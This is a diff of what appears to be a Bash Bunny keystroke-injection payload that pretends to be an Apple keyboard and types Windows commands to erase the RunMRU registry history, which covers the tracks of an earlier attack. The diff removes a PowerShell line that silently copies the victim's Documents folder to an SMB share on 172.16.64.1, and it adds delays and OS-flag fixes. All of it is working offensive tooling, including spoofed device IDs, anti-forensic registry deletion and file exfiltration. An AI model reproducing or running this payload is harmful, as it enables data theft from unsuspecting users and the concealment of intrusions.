@@ -21,18 +21,17 @@ OS="UNITY" #OPTIONS: "UNITY", "MAC", OR "WINDOWS"
 # PLATFORM CHECK
 # FOR DYNAMIC SWITCHING, CREATE FILE '/root/udisk/loot/ghost_cleanup/os_windows' IN YOUR FIRST PAYLOAD.
 if [ -f "/root/udisk/loot/ghost_cleanup/os_windows" ]; then
-    OS="MAC"
+    OS="WINDOWS"
 fi
 if [ -f "/root/udisk/loot/ghost_cleanup/os_mac" ]; then
-    OS="WINDOWS"
+    OS="MAC"
 fi
 if [ -f "/root/udisk/loot/ghost_cleanup/os_unity" ]; then
     OS="UNITY"
 fi
 
 # START
-# ATTACKMODE HID VID_0X05AC PID_0X021E
-ATTACKMODE HID
+ATTACKMODE HID VID_0X05AC PID_0X021E
 
 QUACK DELAY 500
 if [ "$OS"=="UNITY" ]; then
@@ -107,11 +106,13 @@ else #WINDOWS
         QUACK DELAY 1000
         QUACK STRING setlocal enableextensions enabledelayedexpansion
         QUACK ENTER
+        QUACK DELAY 200
         QUACK STRING set len="${LINES}"
         QUACK ENTER
+        QUACK DELAY 200
         QUACK STRING set /a len_pos=%len%-1
         QUACK ENTER
-
+        QUACK DELAY 200
         QUACK STRING for /f "tokens=2*" %%a in ('reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /v MRUList') do set "mru=%%b"
         QUACK ENTER
         QUACK DELAY 200
@@ -121,10 +122,11 @@ else #WINDOWS
         # Get the last Nr of defined lines from MRUList
         QUACK STRING set list=!mru:~0,%len%!
         QUACK ENTER
+        QUACK DELAY 200
         # Set the new MRUList
         QUACK STRING set original_list=!mru:~%len%,%str_len%!
         QUACK ENTER
-
+        QUACK DELAY 200
         # Delete old MRUList
         QUACK STRING reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /v MRUList /f
         QUACK ENTER
@@ -138,8 +140,9 @@ else #WINDOWS
         QUACK ENTER
         QUACK DELAY 200
     else
-        QUACK STRING "powershell -windowStyle minimized \"while (\$true) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; net use \\\172.16.64.1\e guest /USER:guest; robocopy \$ENV:UserProfile\Documents \\\172.16.64.1\e $EXFILTRATE_FILES /S; exit } }\""
+        QUACK STRING reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
         QUACK ENTER
+        QUACK DELAY 200
     fi
 fi
 
